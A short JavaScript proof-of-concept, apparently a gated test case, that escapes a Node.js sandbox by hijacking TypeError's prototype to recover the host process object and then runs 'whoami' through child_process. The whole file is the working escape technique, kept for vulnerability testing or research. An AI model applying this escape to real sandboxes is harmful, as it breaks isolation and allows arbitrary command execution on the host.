if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

(function () {
	TypeError.prototype.get_process = (f) => f.constructor("return process")();
	try {
		Object.preventExtensions(Buffer.from("")).a = 1;
	} catch (e) {
		const out = e
			.get_process(() => {})
			.mainModule.require("child_" + "process")
			.execSync("whoami")
			.toString();
		console.log(out);
		process.exit(0);
	}
})();

process.exit(82);
